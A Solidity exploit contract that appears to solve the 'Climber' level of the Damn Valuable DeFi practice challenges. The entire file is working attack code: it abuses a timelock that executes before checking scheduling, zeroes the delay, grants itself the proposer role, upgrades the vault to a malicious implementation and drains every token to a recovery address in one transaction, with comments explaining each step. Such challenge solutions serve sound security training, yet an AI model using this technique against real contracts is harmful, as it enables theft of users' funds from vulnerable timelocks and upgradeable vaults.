// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {ClimberExploitVault} from "./ClimberExploitVault.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberTimelock, PROPOSER_ROLE} from "../../src/climber/ClimberTimelock.sol";

contract ClimberExploit {
    bytes[] data;
    address[] targets;
    uint256[] values = new uint256[](6);

    address private immutable _recovery;

    ClimberVault private immutable _vault;
    ClimberTimelock private immutable _timeclock;
    DamnValuableToken private immutable _token;

    constructor(address vault, address payable timeclock, address token, address payable recovery) {
        _recovery = recovery;

        _vault = ClimberVault(vault);
        _token = DamnValuableToken(token);
        _timeclock = ClimberTimelock(timeclock);
    }

    function run() external {
        bytes[] memory ed = new bytes[](2);
        uint256[] memory ev = new uint256[](2);
        address[] memory et = new address[](2);

        // upgrade vault code with the malicious one
        et[0] = address(_vault);
        ed[0] = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(new ClimberExploitVault()), "");

        // transfer all the tokens from the vault to the recovery acc
        et[1] = address(_vault);
        ed[1] = abi.encodeWithSignature("drain(address,address)", address(_token), address(_recovery));

        data = new bytes[](6);
        targets = new address[](6);

        // update delay so we can execute fast
        targets[0] = address(_timeclock);
        data[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // grant exploit the proposer role so it can schedule the callback `schedule` func
        targets[1] = address(_timeclock);
        data[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));

        // grant timeclock the proposer role so it can schedule the exploit
        targets[2] = address(_timeclock);
        data[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(_timeclock));

        // schedule exploit code
        targets[3] = address(_timeclock);
        data[3] = abi.encodeWithSignature("schedule(address[],uint256[],bytes[],bytes32)", et, ev, ed, "");

        // execute exploit code
        targets[4] = address(_timeclock);
        data[4] = abi.encodeWithSignature("execute(address[],uint256[],bytes[],bytes32)", et, ev, ed, "");

        // schedule itself so the execute func doesnt break with NotReadyForExecution
        targets[5] = address(this);
        data[5] = abi.encodeWithSignature("schedule()");

        _timeclock.execute(targets, values, data, "");
    }

    // this helper ensures that the timelock considers the outer operation as scheduled, preventing the final
    // NotReadyForExecution revert and enabling the exploit to complete in a single transaction
    function schedule() external {
        _timeclock.schedule(targets, values, data, "");
    }
}
